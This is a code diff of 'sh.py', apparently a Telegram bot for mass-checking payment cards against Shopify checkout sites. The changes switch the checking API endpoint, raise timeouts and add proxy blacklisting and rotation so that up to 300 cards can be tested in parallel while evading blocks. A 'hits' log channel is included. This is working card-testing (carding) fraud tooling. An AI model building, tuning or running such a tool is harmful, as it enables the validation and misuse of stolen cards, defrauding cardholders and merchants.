@@ -2,8 +2,8 @@
 sh.py  v28  —  /sh single-card + /msh mass Shopify checker
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Framework : python-telegram-bot v21
-API       : https://shopicardx.up.railway.app/shopii
-            GET ?cc=NUM|MM|YY|CVV&site=https://DOMAIN&proxy=http://ip:port
+API       : https://goshopi.up.railway.app/shopii
+            GET ?site=https://DOMAIN&cc=NUM|MM|YY|CVV&proxy=http://ip:port
             proxy = http://ip:port  (WITH http:// prefix)
 
 ROOT-CAUSE FIX:
@@ -61,7 +61,7 @@ from config import (
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # CONSTANTS
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-API_URL       = "https://shopicardx.up.railway.app/shopii"
+API_URL       = "https://goshopi.up.railway.app/shopii"
 BOT_CHANNEL   = CHANNEL_LINK
 DEV_LINK_HTML = f'<a href="{BOT_CHANNEL}">{BOT_NAME}</a>'
 
@@ -79,7 +79,7 @@ LOGS_CHANNEL_LINK   = "https://t.me/+BXmeotREVhllODFk"             # hits log ch
 
 SH_COOLDOWN    = 25
 SITE_RETRIES      = 5    # max site attempts per card  (tuned for speed)
-SITE_TIMEOUT      = 5    # seconds per API call
+SITE_TIMEOUT      = 90   # seconds — server-side timeout is 120s; give it 90s
 MAX_CONCURRENT    = 300  # cards checked in parallel
 CARD_STAGGER      = 0.002 # stagger between card launches (seconds)
 SITE_BATCH        = 15   # sites raced in parallel within each retry round
@@ -1391,14 +1391,14 @@ def _proxy_url(proxy: Optional[str]) -> Optional[str]:
 
 async def _call_api(card: str, site: str, proxy: Optional[str],
                     timeout: float = SITE_TIMEOUT) -> tuple:
-    # New API: ?cc=NUM|MM|YY|CVV&site=https://DOMAIN&proxy=http://ip:port
+    # sitechk.py-style API: ?site=URL&cc=CARD&proxy=PROXY  (site first)
     site_clean = _strip_scheme(site)          # remove any existing scheme first
-    site_url   = f"https://{site_clean}"      # add https:// as new API requires
+    site_url   = f"https://{site_clean}"      # add https:// as API requires
     px         = _proxy_url(proxy)
-    url = (f"{API_URL}?cc={card}&site={site_url}&proxy={px}"
-           if px else f"{API_URL}?cc={card}&site={site_url}")
-    # connect=5 so hung proxies fail fast while still giving real sites room
-    _to  = aiohttp.ClientTimeout(total=timeout, connect=5, sock_read=timeout)
+    url = (f"{API_URL}?site={site_url}&cc={card}&proxy={px}"
+           if px else f"{API_URL}?site={site_url}&cc={card}")
+    # connect=8 — enough for proxy handshake; sock_read covers full API wait
+    _to  = aiohttp.ClientTimeout(total=timeout, connect=8, sock_read=timeout)
     try:
         async with aiohttp.ClientSession(timeout=_to) as session:
             async with session.get(url, ssl=False) as r:
@@ -1427,14 +1427,20 @@ async def _call_api(card: str, site: str, proxy: Optional[str],
                     500: "site error! status: 500",
                     502: "site error! status: 500",
                     503: "site error! status: 500",
-                    504: "timeout",
+                    504: "proxy_timeout",  # gateway timeout = proxy issue
                 }
-                return (_emap.get(http_st, f"HTTP Error {http_st}"),
+                return (_emap.get(http_st, f"site error! status: {http_st}"),
                         "Shopify Payments", "0.00", "USD", http_st)
     except asyncio.TimeoutError:
-        return ("timeout", "Shopify Payments", "0.00", "USD", None)
+        # Proxy is the bottleneck — signal caller to rotate, NOT skip site
+        return ("proxy_timeout", "Shopify Payments", "0.00", "USD", None)
     except asyncio.CancelledError:
         raise
+    except aiohttp.ClientConnectorError as e:
+        err = str(e).lower()
+        if "proxy" in err or "tunnel" in err or "connect" in err:
+            return ("proxy_error", "Shopify Payments", "0.00", "USD", None)
+        return (f"connection error: {str(e)[:60]}", "Shopify Payments", "0.00", "USD", None)
     except Exception as e:
         return (f"connection error: {str(e)[:60]}", "Shopify Payments", "0.00", "USD", None)
 
@@ -1481,15 +1487,27 @@ async def _check_card_with_retry(
     attempt         = 0   # total slots consumed
 
     # ── helpers ───────────────────────────────────────────────────────
+    _bad_px: set = set()   # proxies that timed out — rotated out per sitechk.py
+
+    def _pick_proxy() -> Optional[str]:
+        """Pick a proxy not in _bad_px; reset blacklist when all are bad."""
+        if not px_pool:
+            return None
+        avail = [p for p in px_pool if p not in _bad_px]
+        if not avail:        # all proxies exhausted — reset and try again
+            _bad_px.clear()
+            avail = px_pool
+        return random.choice(avail)
+
     async def _try_one(site: str, proxy: Optional[str]):
-        """Wrap _call_api so exceptions become an error-tuple instead of raising."""
+        """Returns (site, proxy_used, result_tuple) — proxy tracked for blacklist."""
         try:
-            return site, await _call_api(card, site, proxy, timeout=site_timeout)
+            return site, proxy, await _call_api(card, site, proxy, timeout=site_timeout)
         except asyncio.CancelledError:
             raise
         except Exception as e:
-            return site, (f"connection error: {str(e)[:60]}",
-                          "Shopify Payments", "0.00", "USD", None)
+            return site, proxy, (f"connection error: {str(e)[:60]}",
+                                 "Shopify Payments", "0.00", "USD", None)
 
     def _pick_site() -> Optional[str]:
         nonlocal pool
@@ -1527,19 +1545,17 @@ async def _check_card_with_retry(
 
         # Race all sites in the batch simultaneously
         tasks = [
-            asyncio.ensure_future(
-                _try_one(s, random.choice(px_pool) if px_pool else None)
-            )
+            asyncio.ensure_future(_try_one(s, _pick_proxy()))
             for s in batch
         ]
 
-        winner        = None
+        winner         = None
         batch_timeouts = 0
 
         try:
             for fut in asyncio.as_completed(tasks):
                 try:
-                    site, (resp, gw, price, currency, http_st) = await fut
+                    site, px_used, (resp, gw, price, currency, http_st) = await fut
                 except asyncio.CancelledError:
                     raise
                 except Exception:
@@ -1549,14 +1565,18 @@ async def _check_card_with_retry(
                 logging.info(f"[API] {card[:6]}** #{attempt}/{max_sites} "
                              f"site={site} → {resp!r}")
 
-                # Timeout → mark dead, tally for early-exit
-                if resp == "timeout" or resp == "Timeout":
-                    batch_timeouts += 1
-                    local_dead.add(site)
-                    last_resp = resp
+                # ── Proxy timeout / error — rotate proxy, keep the site slot ──
+                # The SITE is fine; the PROXY is the bottleneck.
+                # Mark proxy bad, refund the attempt, re-queue the site.
+                if resp in ("proxy_timeout", "proxy_error"):
+                    if px_used:
+                        _bad_px.add(px_used)
+                    attempt    -= 1        # refund slot — site not consumed
+                    tried.discard(site)    # allow retry with fresh proxy
+                    logging.debug(f"[PROXY] {card[:6]}** proxy rotated ({resp})")
                     continue
 
-                # HTTP-level error
+                # HTTP-level error (non-proxy)
                 if http_st and http_st not in (200,):
                     local_dead.add(site)
                     last_resp = f"HTTP {http_st}"
@@ -1579,6 +1599,7 @@ async def _check_card_with_retry(
 
                 # RETRY / ERROR — site gave a non-bank response
                 local_dead.add(site)
+                batch_timeouts += 1
 
         except asyncio.CancelledError:
             for t in tasks: t.cancel()
@@ -1592,23 +1613,14 @@ async def _check_card_with_retry(
         if winner:
             return winner
 
-        # ── Early-exit on dead proxies ────────────────────────────────
-        if batch_timeouts == len(batch):
-            consec_timeouts += batch_timeouts
-        else:
-            consec_timeouts = 0   # a real response resets the counter
+        # (proxy rotation handled above — no CONSEC_TIMEOUT_MAX early-exit needed)
 
-        if consec_timeouts >= CONSEC_TIMEOUT_MAX:
-            logging.warning(
-                f"[SH] {card[:6]}** {consec_timeouts} consecutive timeouts "
-                f"({consec_timeouts * site_timeout:.0f}s wasted) — "
-                f"proxies likely dead, aborting early"
-            )
-            return "DEAD", "timeout", price, currency
-
-    # ── All attempts exhausted ────────────────────────────────────────
+    # ── All attempts exhausted — never expose raw internal error to user ────
+    display = last_resp if last_resp and last_resp not in (
+        "proxy_timeout", "proxy_error", "timeout", "Timeout", ""
+    ) else "Card Declined"
     logging.warning(f"[SH] {card[:6]}** exhausted {max_sites} sites  last={last_resp!r}")
-    return "DEAD", last_resp, price, currency
+    return "DEAD", display, price, currency
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
